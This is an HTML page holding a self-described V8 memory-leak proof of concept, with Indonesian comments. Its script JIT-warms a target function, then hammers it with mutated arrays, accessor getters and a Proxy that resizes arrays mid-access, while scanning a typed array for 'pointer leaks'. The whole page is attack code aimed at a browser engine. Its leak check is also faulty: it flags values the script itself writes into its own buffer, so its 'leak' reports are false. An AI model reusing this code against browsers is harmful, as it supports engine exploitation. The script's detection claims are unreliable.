<!doctype html>
<meta charset="utf-8">
<title>V8 Memory Leak PoC - Stronger</title>

<h2>V8 Memory Leak PoC - Stronger (Fast)</h2>
<pre id="log"></pre>

<script>
const log = m => {
    document.getElementById("log").textContent += m + "\n";
    console.log(m);
};

// TARGET FUNCTION
function vuln(a,i){ return a[i]+1.1; }

// WARMUP (lebih efisien tapi cukup JIT)
function warmup(){
    let arr = Array.from({length:50}, (_,i)=>i+0.5);
    for(let j=0;j<80000;j++) vuln(arr,j%50); // lebih sedikit tapi tetap JIT
    return arr;
}

// AGGRESIVE MUTATION (lebih kuat)
function mutate(arr){
    for(let i=0;i<15;i++) delete arr[i]; 
    arr.length = 10; 
    arr[80] = 1.7976931348623157e+308;
    arr[2] = {x:1};

    Object.defineProperty(arr,3,{
        get(){
            for(let i=0;i<3;i++) arr.push(Math.random()*1e5); // batch push
            return 1.1;
        }
    });
    return arr;
}

// PROXY BREAK ASSUMPTION (lebih efisien)
function breakAssumption(a){
    return new Proxy(a,{
        get(t,p){
            if(p==="length"){
                for(let i=0;i<5;i++) t.push(Math.random()*1e5); // batch
            }
            if(typeof p==="string" && !isNaN(p) && Math.random()<0.6){
                t.push(Math.random()*1e5);
            }
            return Reflect.get(t,p);
        },
        set(t,p,v){
            if(Math.random()<0.3) t.length += 3; // lebih agresif tapi ringan
            return Reflect.set(t,p,v);
        }
    });
}

// TYPED ARRAY (overlay efisien)
let buf = new ArrayBuffer(0x40000); // 256KB
let f64 = new Float64Array(buf);
for(let i=0;i<f64.length;i++) f64[i] = 0x41414141 + i;

// CEK POINTER LEAK (lebih efisien)
function checkTyped(){
    for(let i=0;i<20;i++){ // cek hanya 20 random index
        let idx = Math.floor(Math.random()*f64.length);
        let v = f64[idx];
        if(Math.abs(v)>1e12) log(`[POINTER-LEAK] idx=${idx} val=${v}`);
    }
}

// MAIN LOOP
function run(){
    log("[*] warmup / JIT");
    let base = warmup();

    log("[*] starting pointer-leak fuzzing...");
    for(let i=0;i<300000;i++){
        let arr = base.slice(); // lebih cepat daripada spread
        arr = mutate(arr);
        arr = breakAssumption(arr);

        vuln(arr,5);

        // overlay extreme float random index
        f64[Math.floor(Math.random()*f64.length)] = 1.7976931348623157e+308;

        if(i%2000===0) checkTyped();
        if(i%1000===0) log(`iter ${i}`);
    }
    log("[*] done - pointer leak scan finished");
}

run();
</script>
